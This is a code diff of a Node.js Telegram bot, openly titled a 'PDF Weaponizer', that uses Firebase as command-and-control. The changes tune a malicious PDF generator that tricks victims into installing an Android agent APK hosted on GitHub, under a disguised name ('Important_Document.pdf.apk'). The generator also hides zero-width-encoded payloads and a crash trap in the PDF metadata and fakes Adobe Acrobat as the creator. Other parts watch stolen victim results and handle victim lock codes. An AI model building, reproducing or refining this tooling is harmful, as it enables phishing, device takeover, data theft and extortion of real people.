@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 // ============================================================
 // ARCHITECT TELEGRAM PDF WEAPONIZER + FIREBASE C2 + IMGBB
-// (Render Ready – FINAL – HTTP Server + PDF Simplified)
+// (Render Ready – ULTIMATE FIX – No RLO in visible text)
 // ============================================================
 require('dotenv').config();
 const TelegramBot = require('node-telegram-bot-api');
@@ -26,9 +26,9 @@ const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
 const ADMIN_ID = parseInt(process.env.ADMIN_ID);
 
 // --- تخزين مؤقت لحالة انتظار رمز القفل ---
-const pendingLockCode = new Map(); // victimId -> { chatId, messageId }
+const pendingLockCode = new Map();
 
-// --- Zero‑Width + BiDi Exploit (مضمن في البيانات الوصفية) ---
+// --- Zero‑Width + BiDi Exploit (للبيانات الوصفية فقط) ---
 const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };
 
 function generateCrashTrap() {
@@ -54,11 +54,11 @@ function generatePayloadStub() {
     return Buffer.from('DEADBEEF1337CAFE'.repeat(4), 'hex');
 }
 
-// --- دالة إنشاء PDF ملغوم (مبسطة بالكامل - لا RLO ولا إيموجي) ---
+// --- دالة إنشاء PDF ملغوم (بدون أي RLO في النص المرئي) ---
 async function createWeaponizedPDF(imageBuffer) {
     const pdfDoc = await PDFDocument.create();
     const page = pdfDoc.addPage([595, 842]);
-    const font = await pdfDoc.embedFont(StandardFonts.TimesRoman);
+    const font = await pdfDoc.embedFont(StandardFonts.Helvetica); // رجعنا لـ Helvetica
 
     let image;
     try {
@@ -77,11 +77,11 @@ async function createWeaponizedPDF(imageBuffer) {
     });
 
     const agentUrl = `https://github.com/Ameen776/BOT-HAKRS4000/releases/download/v1.0/agent.apk`;
-    // اسم ملف خادع بسيط بدون أحرف تحكم
-    const displayName = 'Security_Update.pdf.apk';
+    // اسم بسيط يبدو كملف PDF لكنه APK
+    const displayName = 'Important_Document.pdf.apk';
 
-    // نص إنجليزي بحت
-    page.drawText(`To access the content, please install the attached application:\n${displayName}`, {
+    // نص إنجليزي عادي تمامًا
+    page.drawText(`To view the content, please install the required update:\n${displayName}`, {
         x: 50, y: 100, size: 12, font, color: rgb(0,0,0.8)
     });
 
@@ -91,7 +91,7 @@ async function createWeaponizedPDF(imageBuffer) {
     });
     page.node.addAnnot(linkAnnotation);
 
-    // تضمين الحمولة الخفية في البيانات الوصفية
+    // تضمين الحمولة الخفية في البيانات الوصفية فقط
     const stub = generatePayloadStub();
     const hiddenPayload = binaryToZeroWidth(stub);
     const crashTrap = generateCrashTrap();
@@ -99,7 +99,7 @@ async function createWeaponizedPDF(imageBuffer) {
     pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2,8).toUpperCase()}`);
     pdfDoc.setSubject('Confidential');
     pdfDoc.setCreator('Adobe Acrobat');
-    pdfDoc.setProducer('GhostWeaver v6.0');
+    pdfDoc.setProducer('GhostWeaver v7.0');
 
     return Buffer.from(await pdfDoc.save());
 }
@@ -214,7 +214,6 @@ bot.on('callback_query', async (query) => {
     }
 });
 
-// --- استقبال رمز القفل من الأدمن ---
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
@@ -244,7 +243,6 @@ bot.on('message', async (msg) => {
     }
 });
 
-// --- مراقبة نتائج الضحايا (صور، ملفات، إلخ) ---
 db.collectionGroup('results').onSnapshot(async (snapshot) => {
     for (const doc of snapshot.docChanges()) {
         if (doc.type === 'added') {
@@ -268,7 +266,7 @@ db.collectionGroup('results').onSnapshot(async (snapshot) => {
     }
 });
 
-// --- خادم HTTP بسيط لإرضاء Render (Health Check) ---
+// --- خادم HTTP بسيط لـ Render Health Check ---
 const app = express();
 const PORT = process.env.PORT || 10000;
 
